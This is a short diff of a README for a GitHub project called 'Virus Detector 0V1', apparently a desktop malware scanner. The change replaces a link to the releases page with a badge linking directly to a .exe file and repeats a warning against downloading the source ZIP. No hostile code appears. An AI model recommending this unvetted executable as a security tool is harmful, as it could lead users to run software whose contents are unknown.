@@ -5,10 +5,11 @@
 
 ## Download
 
-> ⚠️ Do not use the **"Code > Download ZIP"** button — the file will not work.
+<a href="https://github.com/BLCK-N/Virus-Detector-0V1-/releases/download/0V1/Virus.Detector.0V1.exe">
+  <img src="https://img.shields.io/badge/⬇ Download-Virus.Detector.0V1.exe-blue?style=for-the-badge" alt="Download"/>
+</a>
 
-> Download only via: [**Releases →**](../../releases)
-
+> ⚠️ Do not use **Code > Download ZIP** — the file will not work.
 ## What it does
 
 Virus Detector is a desktop security tool that scans your PC and files for threats.
@@ -22,3 +23,5 @@ Virus Detector is a desktop security tool that scans your PC and files for threa
 ## Author
 
 Made by [/＠](https://github.com/BLCK-N)
+
+
